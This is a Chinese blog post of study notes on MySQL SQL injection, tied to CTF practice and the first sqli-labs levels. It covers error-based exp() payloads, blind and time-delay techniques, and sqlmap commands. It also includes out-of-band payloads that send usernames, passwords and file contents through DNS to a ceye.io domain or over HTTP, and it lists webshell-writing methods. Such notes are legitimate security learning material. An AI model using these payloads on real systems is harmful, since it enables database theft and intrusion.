&lt;p&gt;MySQL 能记录的 Double 数值范围有限，一旦结果超过范围，则该函数报错。这个范围的极限是 709，当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误；&lt;/p&gt;
&lt;p&gt;当用 &lt;code&gt;~&lt;/code&gt; 运算符按位取反的方式得到一个最大值，该运算符可以处理一个字符串，经过其处理的字符串会变成一个很大整数其足以超过 MySQL 的 Double 数组范围，从而报错输出&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意点&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;使用版本：MySQL5.5.5 及以上版本&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;常见用法&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and (select exp(~(select * from(select version())x)))
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;ERROR 1690 (22003): DOUBLE value is out of range in &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;5.5.29&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dual&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;1&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;and&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ERROR&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1690&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;22003&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DOUBLE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;is&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;of&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;in&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;exp(~((select &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;root&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; from dual)))&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and (select exp(~(select * from(select database())x)))
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;ERROR 1690 (22003): DOUBLE value is out of range in &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ctf&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dual&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;//读取文件(13行限制)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;1&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;and&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;load_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/etc/passwd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dump当前上下文中所有的tables和columns&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;注意：因为是当前上下文，所以单引号前条件得存在，正确&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and (select exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)))
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;CTF demo&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://whoamianony.top/2021/05/01/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20MySQL%20exp%28%29%20%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%20Sql%20%E6%B3%A8%E5%85%A5/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://whoamianony.top/2021/05/01/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20MySQL%20exp()%20%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%20Sql%20%E6%B3%A8%E5%85%A5/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意点&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;需要嵌套才能报错回显的原因(个人理解)：&lt;/p&gt;
&lt;p&gt;mysql报错回显(几何函数、exp()等函数)一般报错返回的是列名相关，不嵌套就正常返回列名，比如&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select version()； //其返回结果集的列名即为version()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而在报错回显机制种，一旦嵌套就会详细返回列名中包含的执行语句(MySQL本身报错机制？？？)，比如&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ERROR&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1690&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;22003&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DOUBLE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;is&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;of&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;in&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;exp(~((select &amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;29&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; from dual)))&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;select &amp;#39;5.5.29&amp;#39; from dual&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;即为列名&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/blockquote&gt;
&lt;h2 id=&#34;bool盲注--时间型盲注&#34;&gt;bool盲注 &amp;amp; 时间型盲注&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;盲注&lt;/strong&gt;用在不知道数据库返回值的情况下对数据内容进行猜测&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;盲注适用场景：无法直接回显获取执行结果，只能根据返回状态判断&lt;/p&gt;
&lt;p&gt;bool型：返回 True 和 False 两种状态页面，根据页面返回不同，猜解数据&lt;/p&gt;
&lt;p&gt;时间型：通过注入能够造成延时的特定语句，根据页面的物理反馈，来判断是否注入成功，如：在 SQL 语句中使用 sleep() 函数看加载网页的时间来判断注入点&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;常用函数&#34;&gt;常用函数&lt;/h3&gt;
&lt;h4 id=&#34;编码转换函数&#34;&gt;编码转换函数&lt;/h4&gt;
&lt;p&gt;ord()、ascii() ：将字符转为ascii码&lt;/p&gt;
&lt;p&gt;char()：将ascii码转为字符&lt;/p&gt;
&lt;h4 id=&#34;条件判断函数&#34;&gt;条件判断函数&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;if(exp1, exp2, exp3)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;select &lt;strong&gt;case when&lt;/strong&gt; username=&amp;ldquo;admin&amp;rdquo; &lt;strong&gt;then&lt;/strong&gt; sleep(1) &lt;strong&gt;else&lt;/strong&gt; &amp;ldquo;error&amp;rdquo; &lt;strong&gt;end&lt;/strong&gt; from user&lt;/p&gt;
&lt;h4 id=&#34;截取函数&#34;&gt;截取函数&lt;/h4&gt;
&lt;p&gt;substr()&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ubstr(str, pos, len) //从 pos 位置开始，截取字符串 str 的 len 长度
substr(str from pos for length) //可以用在过滤了，的情况
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;substring()&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;substring(str, pos, len) //从 pos 位置开始，截取字符串 str 的 len 长度
substring(str from pos for length) 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;mid()&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mid(str, pos, length)
mid(str from pos for length)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;注意点&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;以上含pos参数的函数中，pos从1开始&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;left() &amp;amp; right()&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;left(str, len) 
right(str, len)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;正则表达式&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select * from user where password rlike &amp;quot;^1&amp;quot;
select * from user where password REGEXP &amp;quot;^1&amp;quot;
select * from user where password REGEXP &amp;quot;^12&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;延时函数&#34;&gt;延时函数&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sleep(n) //挂起n秒

benchmark(count, sha(1)) //实行sha(1)函数count次数，从而延时

SELECT count(*) from information_schema.columns A, information_schema.columns B, information_schema.tables C; //笛卡尔积造成延时

select * from users where id =1 and IF(1,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,0) //用正则表达式匹配长字符制造延时

rpad(string, length, rpad_string) //rpad()函数将一个字符串string用另一个字符串rpad_string在右侧填充到一定长度length
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;其他函数&#34;&gt;其他函数&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;count()
length()
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;sqlmap检测各类注入&#34;&gt;sqlmap检测各类注入&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;//union注入
sqlmap -u &amp;quot;http://127.0.0.1:8888/Less-1/?id=1&amp;quot; --dbms=MySQL --random-agent --flush-session --technique=U -v 3

//显错注入
--technique=E

//bool盲注
--technique=B

//时间型盲注
--technique=T
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;oob注入&#34;&gt;OOB注入&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;类别&lt;/th&gt;
&lt;th&gt;注入类型&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;带内&lt;/td&gt;
&lt;td&gt;报错、union&lt;/td&gt;
&lt;td&gt;直接回显数据&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;间接推断&lt;/td&gt;
&lt;td&gt;bool、时间盲注&lt;/td&gt;
&lt;td&gt;非直接回显，根据状态间接判断&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;带外&lt;/td&gt;
&lt;td&gt;OOB&lt;/td&gt;
&lt;td&gt;通过其他信道获取数据&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;out-of-band&#34;&gt;Out Of Band&lt;/h3&gt;
&lt;p&gt;带外通道技术(OOB)让攻击者能够利用其他信道获取非直接回显的漏洞。&lt;/p&gt;
&lt;p&gt;带外通道技术通常需要让目标来生成TCP/UDP/ICMP 请求并带有敏感数据，攻击者可以通过这接收和处理这个请求来提取想要的数据。&lt;/p&gt;
&lt;p&gt;前提：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;防火墙允许出站&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;示意图：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 231; 
			flex-basis: 556px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/sql/image-20220102121936554.png&#34; data-size=&#34;1213x523&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/sql/image-20220102121936554.png&#34;
			width=&#34;1213&#34;
			height=&#34;523&#34;
			srcset=&#34;https://coollllllll.github.io/p/sql/image-20220102121936554_huf7b922b0cf559b8255e9ef892f5e47d6_119869_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/sql/image-20220102121936554_huf7b922b0cf559b8255e9ef892f5e47d6_119869_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;oob注入利用原理&#34;&gt;OOB注入利用原理&lt;/h3&gt;
&lt;h4 id=&#34;windows中的unc路径&#34;&gt;Windows中的UNC路径&lt;/h4&gt;
&lt;p&gt;比如Windows中访问共享文件时就会用到如下网络地址，这就是UNC路径：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;\\192.168.33.33\haha\
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;要想带出数据还是要靠DNSLog。&lt;/p&gt;
&lt;p&gt;load_file函数是用来读取文件内容，读取成功会返回文件内容的字符串，失败返回null。&lt;/p&gt;
&lt;p&gt;利用方法：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select load_file(concat(&#39;\\\\&#39;,(select hex(concat_ws(&#39;~&#39;,username,password)) from users limit 0,1),&#39;.xxx.ceye.io\\aa&#39;))

# 通过concat函数将查询结果与域名拼接形成UNC路径，调用load_file函数对UNC路径发起请求，因此成功发起DNS请求将数据外带
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;load_file函数使用注意&#34;&gt;load_file函数使用注意&lt;/h4&gt;
&lt;p&gt;该函数使用受 secure_file_priv 的限制，如果secure_file_priv 值为null或其他特定目录，则无法构造任意UNC路径进行利用&lt;/p&gt;
&lt;h3 id=&#34;大文本传输技巧&#34;&gt;大文本传输技巧&lt;/h3&gt;
&lt;p&gt;域名长度限制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;域名由标签组成，以 &lt;code&gt;.&lt;/code&gt; 分割，标签的长度不可以超过 63 个字符&lt;/li&gt;
&lt;li&gt;整个域名不可以超过 253 个字符，包括 &lt;code&gt;.&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;绕过限制思路：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;load_file读取内容&lt;/li&gt;
&lt;li&gt;substr对文本内容切片&lt;/li&gt;
&lt;li&gt;to_base64对切片后的内容编码&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;to_base64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;load_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;xxx&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;.xxx.ceye.io\\a&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;oracle数据库利用oob的技巧&#34;&gt;Oracle数据库利用OOB的技巧&lt;/h3&gt;
&lt;p&gt;Oracle 数据库中存在发起 HTTP 请求的函数 UTL_HTTP.request，它的返回类型是长度为 2000 或更短的字符串。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;UTL_HTTP.request(url, proxy)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过注入执行下列SQL语句：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select UTL_HTTP.request(&#39;http://ip/xxx.php&#39;||&#39;?id=&#39;||(select version from v$instance)) from dual;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在xxx.php中接收id参数。&lt;/p&gt;
&lt;h2 id=&#34;sql注入命令执行&#34;&gt;SQL注入——命令执行&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;dumpfile函数写shell&lt;/li&gt;
&lt;li&gt;udf执行命令&lt;/li&gt;
&lt;li&gt;sqlmap &amp;ndash;os-shell(本质还是webshell)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;sqli-lab&#34;&gt;sqli-lab&lt;/h1&gt;
&lt;h2 id=&#34;less-1&#34;&gt;Less-1&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;less-2&#34;&gt;Less-2&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;SELECT * FROM users WHERE id=$id LIMIT 0,1&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;与Less-1利用方式一致，闭合时候不同&lt;/p&gt;
&lt;h2 id=&#34;less-3&#34;&gt;Less-3&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;与Less-1利用方式一致，闭合时候不同&lt;/p&gt;
&lt;h2 id=&#34;less-4&#34;&gt;Less-4&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$id = &#39;&amp;quot;&#39; . $id . &#39;&amp;quot;&#39;;
$sql=&amp;quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
